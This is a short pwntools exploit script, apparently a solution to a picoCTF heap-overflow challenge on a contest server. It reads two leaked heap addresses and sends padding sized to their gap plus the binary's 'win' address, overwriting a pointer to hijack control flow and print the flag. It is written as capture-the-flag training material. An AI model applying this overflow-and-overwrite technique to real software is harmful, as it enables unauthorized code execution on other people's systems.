#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else: 
        r = remote("mimas.picoctf.net", 64123)

    return r


def main():
    r = conn()

    r.sendlineafter(b'choice: ', b'1')

    r.recvuntil(b'[*]   0x')
    write_addr = int(r.readline().strip().split(b' ')[0].decode(), 16)

    r.recvuntil(b'[*]   0x')
    overwrite_addr = int(r.readline().strip().split(b' ')[0].decode(), 16)

    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'buffer: ', b'A'*(overwrite_addr-write_addr) + p64(exe.symbols.win))
    r.sendlineafter(b'choice: ', b'4')

    print(r.recvuntil(b'}'))

if __name__ == "__main__":
    main()
